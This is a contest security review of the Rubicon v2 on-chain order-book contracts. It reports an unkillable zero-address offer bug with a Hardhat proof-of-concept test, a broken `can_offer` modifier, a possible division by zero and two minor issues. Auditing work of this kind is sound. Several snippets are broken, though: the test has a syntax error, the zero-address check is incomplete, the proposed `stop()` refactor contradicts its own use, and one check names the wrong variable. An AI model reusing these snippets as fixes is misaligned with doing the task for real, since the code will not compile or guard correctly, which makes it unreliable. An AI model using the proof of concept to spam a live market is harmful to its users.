
# Rubicon Code4rena Security Review

A security review of the [Rubicon v2](https://code4rena.com/contests/2023-04-rubicon-v2). An onchain order book protocol for Ethereum, built on L2s.

Author: [gkrastenov](https://twitter.com/gkrastenov)

# Findings

| ID     |  Title                                                                                        | Severity      |
| :------| :------------------------------------------------------------------------------------------   | :------------ |
| [H-01] | Market can be inflated with unkillable offers                                                 | High          |
| [M-01] | Modifier can_offer is incorrect                                                               | Medium        |
| [L-01] | Possible division error                                                                       | Low           |
| [I-01] | Using SafeMath when compiler is ^0.8.0                                                        | Informational |
| [I-02] | Unused storage variable                                                                       | Informational |

# High

## [H-01] Market can be inflated with unkillable offers
### Impact
The market can be inflated with offers which can not be killed/canceled or bought. Currently, when a new offer is created owner and recipient address are coming from arguments previously setted from msg.sender [516-517](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L516-L517) . Malicious user can create many offers where owner and recipient address are `address(0)` like make this offers to can not be killed/canceled or bought.

### Proof of Concept
Paste this test in ProtocolDeployment.ts

```javascript
it.only(Offers", async function () {
    const { testStableCoin, testCoin, rubiconMarket, owner, otherAccount } =
      await loadFixture(deployRubiconProtocolFixture);

      console.log('start:');

    await rubiconMarket.functions[
      "offer(uint256,address,uint256,address,address,address)"
    ](
      parseUnits("0.9", 6),
      testStableCoin.address,
      parseUnits("1"),
      testCoin.address,
      ethers.constants.AddressZero, // owner
      ethers.constants.AddressZero, // recipient
      { from: owner.address }
    );

    // my id is 5 here
    expect(await rubiconMarket.getOwner(5)).to.equal(ethers.constants.AddressZero );
    expect(await rubiconMarket.getRecipient(5)).to.equal(
      ethers.constants.AddressZero
    );

    await rubiconMarket.functions[
      "kill(bytes32)"
    ](
      ethers.utils.hexZeroPad(ethers.utils.hexlify(5), 32),
      { from: owner.address }
    );

  });
```

### Tools Used
Manual review, Hardhat test

### Recommended Mitigation Steps
Add one more condition when the user create a new offer.

```
require(owner != address(0) && recipient != address, "Zero address for owner and recipient!");
```

# Medium

## [M-01] Modifier can_offer is incorrect
### Impact
Modifier can_offer is incorrect because it checks if `!isClosed()` is true [598](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L598). The method `isClosed()` always return false and the condition is passed every time. Reading the comment above the modifier [596](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596) I think that the developers wants to stop market when its need and no new offers to be allowed for creating.

### Tools Used
Mannual review

### Recommended Mitigation Steps
Instead of calling of `isClosed()` method use `stop()` method which fit more with this condition.

```
/// @dev After close_time has been reached, no new offers are allowed.
modifier can_offer() override {
    require(!stop());
    _;
}
```

Also refactor the `stop()` method

```
function stop(bool isStopped) external auth {
    stopped = isStopped;
}
```

# Low
## [L-01] Possible division error
### Impact 
If `rewardsDuration[token]` is equal to zero during the calculation of rewardRatio in `notifyRewardAmount(...)` will revert.
[233](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L233)

### Mitigation steps:
Add additional check for that

```solidity
require(_rewardsDuration != 0, "Invalid duration time");
```

# Information
##  [I-01] Using SafeMath when compiler is ^0.8.0
There is no need to use SafeMath when compiler is ^0.8.0 because it has built-in under/overflow checks.

##  [I-02] Unused storage variable
Storage variable `stopped` is unused and does not affect the contracts. It should be removed or be used for something else.